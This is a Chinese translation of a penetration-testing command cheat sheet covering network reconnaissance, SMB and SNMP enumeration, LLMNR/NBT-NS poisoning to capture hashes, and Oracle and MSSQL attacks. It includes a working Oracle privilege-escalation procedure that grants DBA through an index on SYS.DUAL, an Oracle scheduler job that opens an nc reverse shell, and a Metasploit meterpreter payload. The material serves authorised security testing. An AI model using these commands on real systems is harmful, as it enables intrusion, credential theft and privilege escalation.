# 渗透测试工具备忘录
**_声明：本文翻译自[Penetration Testing Tools Cheat Sheet
](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) 。_**
## 简介
渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 [本站](https://highon.coffee/blog/)
其他备忘录。
本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。
文中缺漏之处欢迎 [推特](https://twitter.com/Arr0way) 私戳。
### 更新日志：
17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。
## 开始前
### 网络配置
#### 设置IP 地址
    ifconfig eth0 xxx.xxx.xxx.xxx/24
#### 子网划分
    ipcalc xxx.xxx.xxx.xxx/24 
    ipcalc xxx.xxx.xxx.xxx 255.255.255.0
## 公开来源情报
### 被动信息收集
#### DNS
##### WHOIS 枚举
    whois domain-name-here.com
##### 查询DNS IP
    dig a domain-name-here.com @nameserver
##### 查询MX记录
    dig mx domain-name-here.com @nameserver
##### 用DIG 查询域传送
    dig axfr domain-name-here.com @nameserver
## DNS 域传送
命令 | 解释  
---|---  
`nslookup -> set type=any -> ls -d blah.com` | Windows DNS域传送  
`dig axfr blah.com @ns1.blah.com` | Linux DNS 域传送  
### 邮件
#### Simply Email
使用Simply
Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply
Email还可以验证收集的邮件地址。
    git clone https://github.com/killswitch-GUI/SimplyEmail.git
    ./SimplyEmail.py -all -e TARGET-DOMAIN
### 半主动信息收集
#### 基本指纹识别
手动指纹识别/banner抓取
命令 | 解释  
---|---  
`nc -v 192.168.1.1 25`  
`telnet 192.168.1.1 25` | 通过显示banner识别版本和指纹  
#### 使用NC抓取banner
    nc TARGET-IP 80
    GET / HTTP/1.1
    Host: TARGET-IP
    User-Agent: Mozilla/5.0
    Referrer: meh-domain
### 主动信息收集
#### DNS 爆破
##### DNSRecon
DNS Enumeration Kali - DNSRecon  
---  
root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml
ouput.xml  
#### 端口扫描
##### Nmap命令
更多命令，详见 [Nmap备忘录](https://highon.coffee/blog/nmap-cheat-sheet/) 。
基本Nmap 命令：
命令 | 解释  
---|---  
`nmap -v -sS -A -T4 target` | 详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪  
`nmap -v -sS -p--A -T4 target` | 同上，且扫描所有TCP端口，耗时更长  
`nmap -v -sU -sS -p- -A -T4 target` | 同上，且扫描所有UDP端口，耗时巨长  
`nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X` |
扫描可能包含漏洞的SMB服务  
ls /usr/share/nmap/scripts/* | grep ftp | 利用关键字搜索nmap脚本  
别在外网采用`T4` 扫描，使用`TCP` 连接扫描时用`T2` 比较合适。`T4`
扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用`T4/T5`
扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。
###### Nmap UDP扫描
    nmap -sU TARGET
###### UDP 协议扫描器
    git clone https://github.com/portcullislabs/udp-proto-scanner.git
扫描文件中IP地址的所有服务
    ./udp-protocol-scanner.pl -f ip.txt
扫描特定UDP服务
    udp-proto-scanner.pl -p ntp -f ips.txt
###### 其他主机发现
不使用nmap发现主机的方法：
命令 | 解释  
---|---  
`netdiscover -r 192.168.1.0/24` | 利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商  
## 枚举和攻击网络服务
用于识别/枚举网络服务的工具。
### SAMB / SMB / Windows 域枚举
#### Samba枚举
##### SMB枚举工具
    nmblookup -A target
    smbclient //MOUNT/share -I target -N
    rpcclient -U "" target
    enum4linux target
当然也可参考本站的 [nbtscan 的速查表](https://highon.coffee/blog/nbtscan-cheat-sheet/)
##### SMB 版本指纹识别
    smbclient -L //192.168.1.100
##### 寻找开放的SMB共享
    nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24
##### 枚举SMB用户
    nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254
    python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
RID循环（RID Cycling ）
    ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
Metasploit的RID循环攻击模块
    use auxiliary/scanner/smb/smb_lookupsid
###### 手动测试空会话
    Windows:
    net use \\TARGET\IPC$ "" /u:""
    Linux:
    smbclient -L //192.168.99.131
###### NBTScan unixwiz
在Kali上安装使用：
    apt-get install nbtscan-unixwiz 
    nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan
#### LLMNR / NBT-NS欺骗
从网络中窃取凭证
##### 使用Metasploit进行 LLMNR / NetBIOS请求
欺骗/毒化 LLMNR / NetBIOS请求：
    auxiliary/spoof/llmnr/llmnr_response
    auxiliary/spoof/nbns/nbns_response
抓取哈希
    auxiliary/server/capture/smb
    auxiliary/server/capture/http_ntlm
最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。
##### Responder.py
你也可以选择使用 responder
    git clone https://github.com/SpiderLabs/Responder.git
    python Responder.py -i local-ip -I eth0
注：整个渗透测试过程可以一直允许Responder.py
#### SNMP枚举工具
SNMP枚举工具有很多。
美化SNMP输出结果使易于阅读。
    apt-get install snmp-mibs-downloader download-mibs
    echo "" > /etc/snmp/snmp.conf
命令 | 解释  
---|---  
`snmpcheck -t 192.168.1.X -c public`  
snmpwalk -c public -v1 192.168.1.X 1 | grep hrSWRunName | cut -d __ -f  
`snmpenum -t 192.168.1.X`  
`onesixtyone -c names -i hosts` | SNMP枚举  
##### SNMPv3枚举工具
使用nmap识别SNMPv3服务器
    nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。
    apt-get install snmp snmp-mibs-downloader
    wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler
[在GitHub上的安全列表](https://github.com/danielmiessler/SecLists) 。
    /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
#### 远程服务枚举
这已是老生常谈，但为了本文内容的全面还是包含如下。
`nmap -A` 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。
##### RSH 枚举
###### RSH运行命令
    rsh  
###### MetasploitRSH 登陆扫描
    auxiliary/scanner/rservices/rsh_login
###### 使用rusers显示已登陆用户
    rusers -al 192.168.2.1
###### 使用rlogin扫描整个子网
    rlogin -l  
    e.g rlogin -l root TARGET-SUBNET/24
#### 使用finger枚举
    finger @TARGET-IP
    finger batman@TARGET-IP
##### 利用Solaris的bug显示所有已登录用户
    finger 0@host  
    SunOS: RPC services allow user enum:
    $ rusers # users logged onto LAN
    finger 'a b c d e f g h'@sunhost
#### rwho
使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。
## TLS&SSL 测试
### testssl.sh
测试单一主机并将结果输出的HTML文件：
    ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html
## 漏洞评估
在Kali Rolling上安装OpenVAS 8
    apt-get update
    apt-get dist-upgrade -y
    apt-get install openvas
    openvas-setup
确认openvas 正在运行：
    netstat -tulpn
通过`https://127.0.0.1:9392` 登陆openvas，密码是在安装时设置好的。
## 数据库渗透测试
攻击暴露在互联网上的数据库。
### Oracle
安装 oscanner：
    apt-get install oscanner
运行 oscanner：
    oscanner -s 192.168.1.200 -P 1521
#### Oracle TNS版本指纹识别
安装 tnscmd10g ：
    apt-get install tnscmd10g
识别：
    tnscmd10g version -h TARGET
    nmap --script=oracle-tns-version
#### 爆破Oracle账户
验证默认账户
    nmap --script=oracle-sid-brute 
     nmap --script=oracle-brute
对Oracle TNS 运行nmap脚本：
    nmap -p 1521 -A TARGET
#### Oracle权限提升
利用条件：
  * Oracle必须暴露在互联网上
  * 使用默认账户，如scott
简明流程：
  * 创建函数
  * 创建表 SYS.DUAL 的索引
  * 刚刚建立的索引执行了SCOTT.DBA_X 函数
  * 函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户
  * 创建具有DBA权限的账户
下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。
##### 使用NMAP NSE脚本验证oracle数据库中的默认账户：
    nmap --script=oracle-sid-brute 
    nmap --script=oracle-brute
使用脆弱账号登陆（假设你发现了一个）。
##### 确认一个oracle用户的权限级别
    SQL> select * from session_privs; 
    SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
    curren_user is 
    pragma autonomous_transaction; 
    begin 
    execute immediate 'grant dba to user1 identified by pass1';
    commit;
    return 'FOO';
    end;
##### Oracle权限提升和访问DBA
运行netcat，`netcat -nvlp 443` 。
    SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
##### 运行查询语句
    SQL> Select * from session_privs;
这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。
##### 移除利用痕迹：
    drop index exploit_1337;
##### 获取Oracle反弹shell：
    begin
    dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
        'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
        SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
    dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
    dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
    dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
    dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
    dbms_scheduler.enable('rev_shell'); 
    end;
### MSSQL
枚举/发现
Nmap
    nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
Metasploit
    msf > use auxiliary/scanner/mssql/mssql_ping
#### 爆破 MSSQL登陆
    msf > use auxiliary/admin/mssql/mssql_enum
#### Metasploit MSSQL Shell
    msf > use exploit/windows/mssql/mssql_payload
    msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
## 网络
### Plink.exe 隧道
PuTTY Link 隧道
转发运程端口到本地地址：
    plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
### 跳板（Pivoting）
#### SSH 跳板（ssh Pivoting）
    ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
需在`/etc/proxychains.conf` 添加sock4 `127.0.0.1 1010`